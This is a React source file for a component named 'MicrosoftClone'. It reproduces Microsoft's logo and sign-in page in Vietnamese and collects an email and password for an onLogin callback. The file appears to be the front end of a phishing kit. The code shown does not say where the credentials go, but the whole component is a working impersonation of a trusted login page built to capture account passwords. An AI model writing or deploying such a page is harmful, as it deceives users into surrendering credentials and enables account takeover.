import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader, Eye, EyeOff } from 'lucide-react';

const MicrosoftClone = ({ onLogin, isLoading }) => {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);

    const handleSubmit = (e) => {
        e.preventDefault();
        if (username && password) {
            onLogin({ username, password });
        }
    };
    
    return (
        <div
            className="w-full flex flex-col items-center justify-center p-4 sm:p-6"
        >
            <div className="w-full flex flex-col items-center text-center mb-8">
                <svg className="w-12 sm:w-16" viewBox="0 0 21 21"><path fill="#f25022" d="M1 1h9v9H1z"/><path fill="#00a4ef" d="M1 11h9v9H1z"/><path fill="#7fba00" d="M11 1h9v9h-9z"/><path fill="#ffb900" d="M11 11h9v9h-9z"/></svg>
                <h1 className="text-xl sm:text-2xl font-semibold mt-6 text-gray-800">Đăng nhập</h1>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-4 w-full max-w-sm">
                 <Input
                    type="email"
                    placeholder="Email, điện thoại hoặc Skype"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full p-2 border-b-2 border-gray-400 focus:border-blue-600 outline-none focus:ring-0 text-black placeholder-gray-600 bg-transparent text-base sm:text-lg"
                />
                <div className="relative">
                     <Input
                        type={showPassword ? 'text' : 'password'}
                        placeholder="Mật khẩu"
                        required
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full p-2 border-b-2 border-gray-400 focus:border-blue-600 outline-none focus:ring-0 text-black placeholder-gray-600 bg-transparent text-base sm:text-lg pr-10"
                    />
                    <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-0 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500 hover:text-gray-700"
                        aria-label={showPassword ? "Ẩn mật khẩu" : "Hiện mật khẩu"}
                    >
                        {showPassword ? <EyeOff /> : <Eye />}
                    </button>
                </div>
                <div className="text-right pt-4">
                    <Button
                        type="submit"
                        className="bg-[#0067b8] hover:bg-[#005ae0] text-white font-semibold py-2 px-8 sm:px-10 text-sm"
                        disabled={isLoading}
                    >
                        {isLoading ? <Loader className="animate-spin" /> : 'Đăng nhập'}
                    </Button>
                </div>
            </form>
        </div>
    );
};

export default MicrosoftClone;